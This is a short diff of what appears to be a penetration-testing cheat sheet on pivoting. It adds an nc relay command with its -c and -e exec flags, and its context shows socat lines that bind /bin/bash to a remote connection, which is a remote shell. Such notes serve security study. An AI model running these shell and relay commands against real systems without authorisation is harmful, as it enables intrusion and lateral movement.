@@ -476,6 +476,14 @@ socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
   # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash
 ```
 
+- With NC
+```
+nc -lvnp 443 -c "nc TARGET PORT"
+  -c = --sh-exec
+  -e = --exec
+```
+
+
 ### Rpivot
 - Reverse SOCKS proxy
 - Similar to dynamic port forwarding, but this time we start it on the pivot
